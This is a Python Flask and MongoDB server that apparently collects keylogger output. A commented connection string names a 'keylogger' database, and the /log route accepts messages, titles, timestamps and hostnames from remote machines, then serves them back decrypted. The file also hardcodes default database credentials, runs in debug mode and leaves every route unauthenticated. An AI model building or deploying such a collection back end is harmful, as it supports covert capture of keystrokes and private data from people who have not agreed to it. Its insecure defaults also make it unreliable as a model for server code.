from flask import request, Flask, jsonify
from flask_pymongo import PyMongo
from cryptography.fernet import Fernet
from logging import exception
from os import environ

#CONSTANTS
TABLE = 'logger'
PARAMS = '?authSource=admin'
URL = environ.get('MONGODB_URL') or "mongodb://root:admin@localhost/"
MSG_SUCESS = "Insert sucessfully"
MSG_EXIST = "Insert already exist"
MSG_NULL = "Error null values"
MSG_INT_ERROR = "Internal Error"

app = Flask(__name__)
app.config['MONGO_URI'] = f'{URL}{TABLE}{PARAMS}'
#app.config['MONGO_URI']='mongodb://root:admin@localhost/keylogger?authSource=admina'
mongo = PyMongo(app)

# KEY
KEY = Fernet.generate_key()
TOKEN = Fernet(KEY)

def cifrar(msg):
    return TOKEN.encrypt(str.encode(msg))
def decifrar(msg):
    return (TOKEN.decrypt(msg)).decode()

@app.before_first_request
def clear_tables():
    try:
        mongo.db.logs.drop()
    except Exception:
        print("[SERVER]: Error at clear_tables()")

@app.route('/ping')
def ping():
    return jsonify({"message": 'Pong!'})

@app.route('/host', methods=['POST'])
def insertHost():
    try:
        data = request.json
        hn = data['hostname']
        if hn:
            if mongo.db.hosts.find_one(data): # CHECK IF EXIST
                return jsonify({"message": MSG_EXIST})
            mongo.db.hosts.insert_one(data)
            data.update({'_id': str(data['_id'])})
            return jsonify({"message": MSG_SUCESS, "result": data})
        else:
            return jsonify({"message": MSG_NULL})
    except:
        print("[SERVER]: Error in route /host [POST] ->")
        return jsonify({"message": MSG_INT_ERROR}), 500

@app.route('/host', methods=['GET'])
def viewHosts():
    try:
        data = mongo.db.hosts.find()
        toReturn = []
        for doc in data:
            del doc['_id']
            toReturn.append(doc)
        if toReturn:
            return jsonify({
                "count": len(toReturn),
                "message":"Host's list",
                "results": toReturn
            }), 200
        else:
            return jsonify({
                "count": 0,
                "message":"Host's list",
                "results": {}
            }), 200
    except Exception:
        exception("[SERVER]: Error in route /host [GET] ->")
        return jsonify({"message": MSG_INT_ERROR}), 500

@app.route('/log', methods=['GET'])
def viewLogs():
    try:
        data = mongo.db.logs.find()
        toReturn = []
        for doc in data:
            del doc['_id']
            doc.update({'message': decifrar(doc['message'])})
            toReturn.append(doc)
        if toReturn:
            return jsonify({
                "count": len(toReturn),
                "message":"Log's list",
                "results": toReturn
            }), 200
        else:
            return jsonify({
                "count": 0,
                "message":"Log's list",
                "results": {}
            }), 200
    except Exception:
        exception("[SERVER]: Error in route /log [GET] ->")
        return jsonify({"message": MSG_INT_ERROR}), 500

@app.route('/log', methods=['POST'])
def insertLog():
    try:
        msg = request.json['message']
        title = request.json['title']
        dt = request.json['datetime']
        hn = request.json['hostname']
        if msg and title and dt and hn: 
            data = request.json
            message = cifrar(msg)
            data.update({'message': message})
            mongo.db.logs.insert_one(data)
            data.update({'message': str(message),'_id': str(data['_id'])})
            return jsonify({"message": data})
        else:
            return jsonify({"message": MSG_NULL})
    except Exception:
        exception("[SERVER]: Error in route /log [POST] ->")
        return jsonify({"message": MSG_INT_ERROR}), 500

if __name__ == "__main__":
    app.run(debug=True)